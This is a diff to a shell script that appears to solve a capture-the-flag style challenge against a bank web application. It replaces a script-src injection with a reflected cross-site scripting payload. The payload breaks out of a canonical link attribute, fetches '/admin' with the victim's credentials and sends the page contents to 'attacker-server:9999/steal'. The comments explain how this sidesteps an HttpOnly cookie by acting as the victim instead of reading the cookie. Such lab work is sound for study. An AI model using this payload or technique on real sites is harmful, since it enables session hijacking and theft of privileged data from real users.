@@ -27,11 +27,21 @@ COLLECTOR="${COLLECTOR_URL:-$HOST:9999}"
 SESSION="apex028-$$"
 trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT
 
-# The reflection reaches four places, and one of them is a `<script src>`. No
-# breakout is needed there: point it at a host that serves JavaScript, and the
-# bank's own page loads the attacker's script from the bank's origin. The
-# collector answers `/static/analytics.js` with exactly that.
-PAYLOAD="attacker-server:9999"
+# The reflection reaches four places. The `<script src>` is the tidiest —
+# point it at a host that serves JavaScript and the bank's page loads the
+# attacker's script from the bank's origin — but the script that host serves
+# reads `document.cookie`, and this session cookie is `HttpOnly`, so it reads
+# nothing.
+#
+# The breakout therefore goes through the canonical link, and the injected
+# script asks the *application* rather than the browser. Cross-site scripting
+# does not need to read a cookie; it needs to act as the person who has one.
+# `/admin` prints the flag to an administrator, and `fetch` sends the cookie
+# whether or not JavaScript is allowed to look at it.
+PAYLOAD="$(cat <<'HTML'
+"><script>fetch("/admin",{credentials:"include"}).then(r=>r.text()).then(t=>{new Image().src="http://attacker-server:9999/steal?c="+encodeURIComponent(t)})</script><x y="
+HTML
+)"
 
 # Opened on a path the cache does not hold, so that this session's own first
 # request does not become the clean entry that then has to expire.
